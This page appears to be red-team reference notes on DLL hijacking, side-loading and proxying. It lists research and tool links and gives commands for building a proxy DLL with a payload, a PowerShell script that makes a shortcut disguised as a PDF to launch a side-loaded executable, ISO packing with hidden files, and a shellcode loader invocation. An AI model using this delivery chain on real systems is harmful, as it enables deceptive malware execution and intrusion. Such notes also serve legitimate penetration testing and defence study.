---
description: DLL Hijacking / DLL Side-Loading / DLL Proxying
---

# DLL Hijacking

- [https://hijacklibs.net/](https://hijacklibs.net/)
- [https://github.com/XForceIR/SideLoadHunter/tree/main/SideLoads](https://github.com/XForceIR/SideLoadHunter/tree/main/SideLoads)
- [https://dec0ne.github.io/research/2021-04-26-DLL-Proxying-pt1/](https://dec0ne.github.io/research/2021-04-26-DLL-Proxying-pt1/)
- [https://blog.cyble.com/2022/07/27/targeted-attacks-being-carried-out-via-dll-sideloading/](https://blog.cyble.com/2022/07/27/targeted-attacks-being-carried-out-via-dll-sideloading/)
- [https://besteffortteam.it/onedrive-and-teams-dll-hijacking/](https://besteffortteam.it/onedrive-and-teams-dll-hijacking/)
- [https://www.binarydefense.com/resources/blog/demystifying-dll-hijacking-understanding-the-intricate-world-of-dynamic-link-library-attacks/](https://www.binarydefense.com/resources/blog/demystifying-dll-hijacking-understanding-the-intricate-world-of-dynamic-link-library-attacks/)
- [https://xss.is/threads/67021/](https://xss.is/threads/67021/)
- [https://xss.is/threads/67718/](https://xss.is/threads/67718/)
- [https://www.r-tec.net/r-tec-blog-dll-sideloading.html](https://www.r-tec.net/r-tec-blog-dll-sideloading.html)

{% embed url="https://youtu.be/3eROsG_WNpE" %}

Print debug output from a DLL:

```c
#ifdef _DEBUG
#include <stdio.h>
#include <string.h>
#define __FILENAME__ (strrchr(__FILE__, '\\') ? strrchr(__FILE__, '\\') + 1 : __FILE__)
#define DPRINT(...) { \
  fprintf(stderr, "DEBUG: %s:%d:%s(): ", __FILENAME__, __LINE__, __FUNCTION__); \
  fprintf(stderr, __VA_ARGS__); \
}
#else
#define DPRINT(...)
#endif
```




## DLL Side-Loading with ISO Packing

- [https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/](https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/)
- [https://blog.sunggwanchoi.com/recreating-an-iso-payload-for-fun-and-no-profit/](https://blog.sunggwanchoi.com/recreating-an-iso-payload-for-fun-and-no-profit/)
- [https://github.com/ChoiSG/OneDriveUpdaterSideloading](https://github.com/ChoiSG/OneDriveUpdaterSideloading)

Generate a proxy DLL with [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy):

```
Cmd > SharpDllProxy.exe --dll C:\Windows\System32\version.dll --payload OneDrive.Update
Cmd > move output_version\tmp1F94.dll C:\out\vresion.dll
```

Create a malicious link (also [here](https://gist.github.com/mttaggart/eb2ba020b8816cfe3da4cfd835240b7d)):

```powershell
$obj = New-object -ComObject wscript.shell
$link = $obj.createshortcut("C:\Tools\PackMyPayload\out\clickme.lnk")
$link.windowstyle = "7"
$link.targetpath = "%windir%/system32/cmd.exe"
$link.iconlocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13" # PDF ico
$link.arguments = "/c start update.exe & ""%ProgramFiles(x86)%/Microsoft/Edge/Application/msedge.exe"" %cd%/fake.pdf"
$link.save()
```

Pack all the files into an ISO with [PackMyPayload](https://github.com/mgeeky/PackMyPayload):

```
PS > python .\PackMyPayload.py .\out\ .\out\a.iso --out-format iso --hide OneDriveStandaloneUpdater.exe,vresion.dll,version.dll,fake.pdf
```




## Unlock DllMain

- [https://elliotonsecurity.com/perfect-dll-hijacking/](https://elliotonsecurity.com/perfect-dll-hijacking/)
- [https://github.com/ElliotKillick/LdrLockLiberator](https://github.com/ElliotKillick/LdrLockLiberator)
- [https://elliotonsecurity.com/what-is-loader-lock/](https://elliotonsecurity.com/what-is-loader-lock/)
- [https://habr.com/ru/articles/792424/](https://habr.com/ru/articles/792424/)




## CVE-2025-24076, CVE-2025-24994

- [https://blog.compass-security.com/2025/04/3-milliseconds-to-admin-mastering-dll-hijacking-and-hooking-to-win-the-race-cve-2025-24076-and-cve-2025-24994/](https://blog.compass-security.com/2025/04/3-milliseconds-to-admin-mastering-dll-hijacking-and-hooking-to-win-the-race-cve-2025-24076-and-cve-2025-24994/)




## Tools

- [https://github.com/monoxgas/Koppeling](https://github.com/monoxgas/Koppeling)



### DLL Proxying

- [https://github.com/Flangvik/SharpDllProxy](https://github.com/Flangvik/SharpDllProxy)
- [https://github.com/tothi/dll-hijack-by-proxying](https://github.com/tothi/dll-hijack-by-proxying)
- [https://github.com/kagasu/ProxyDllGenerator](https://github.com/kagasu/ProxyDllGenerator)
- [https://github.com/namazso/dll-proxy-generator](https://github.com/namazso/dll-proxy-generator)
- [https://github.com/mrexodia/perfect-dll-proxy](https://github.com/mrexodia/perfect-dll-proxy)



### Shhhloader

- [https://github.com/icyguider/Shhhloader](https://github.com/icyguider/Shhhloader)

```
$ ./Shhhloader.py -p RuntimeBroker.exe -d -dp vresion.dll -o version.dll -s domain -sa megacorp.local shellcode.bin
```
